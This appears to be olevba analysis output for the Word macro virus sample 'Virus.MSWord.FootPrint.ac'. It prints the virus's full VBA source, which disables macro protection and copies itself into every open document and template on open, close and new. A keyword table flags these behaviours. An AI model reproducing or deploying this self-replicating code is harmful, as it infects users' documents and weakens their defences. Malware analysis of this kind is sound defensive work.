olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.FootPrint.ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.FootPrint.ac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Private Sub CommandButton1_Click()
UserForm7.Show
End Sub

'SystemTimeWar
Private Sub Document_Close()
On Error Resume Next
Document_Open
End Sub
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = False
Dim al, name As String
Dim adoc As Document
Dim atpl As Template
Dim CoL As Integer
ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
Open "c:\footprint.$$$" For Input As #1
Open "c:\footprint.$$1" For Output As #2
Line Input #1, al
Line Input #1, al
Line Input #1, al
Line Input #1, al
While Not EOF(1)
    Line Input #1, al
    Print #2, al
Wend
Close 1
Close 2
name = Hour(Time$)
For Each adoc In Documents
    adoc.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = adoc.FullName
    
    If Not adoc.CustomDocumentProperties(name) Then
        adoc.CustomDocumentProperties.Add name:=name, LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = adoc.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
For Each atpl In Templates
    If Not atpl.CustomDocumentProperties(name) Then
        atpl.CustomDocumentProperties.Add name:=name, LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = atpl.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
NormalTemplate.Save
ActiveDocument.Save
Kill "c:\footprint.$$?"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

